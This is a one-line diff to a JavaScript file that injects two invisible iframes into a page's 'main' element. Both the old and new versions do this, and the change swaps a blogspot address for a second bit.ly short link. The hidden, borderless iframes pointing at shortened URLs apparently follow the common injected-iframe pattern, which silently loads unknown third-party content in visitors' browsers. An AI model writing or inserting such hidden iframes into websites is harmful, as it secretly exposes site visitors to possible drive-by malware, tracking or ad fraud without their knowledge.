@@ -1,1 +1,1 @@
-document.getElementById("main").innerHTML = '<iframe src="//bit.ly/3bopnY9" style="display: none;" frameborder="0" marginwidth="0" marginheight="0"></iframe><iframe src="https://shirotenshii.blogspot.com/" style="display: none;" frameborder="0" marginwidth="0" marginheight="0"/></iframe>';
+document.getElementById("main").innerHTML = '<iframe src="//bit.ly/3bopnY9" style="display: none;" frameborder="0" marginwidth="0" marginheight="0"></iframe><iframe src="//bit.ly/30vOaSS" style="display: none;" frameborder="0" marginwidth="0" marginheight="0"/></iframe>';
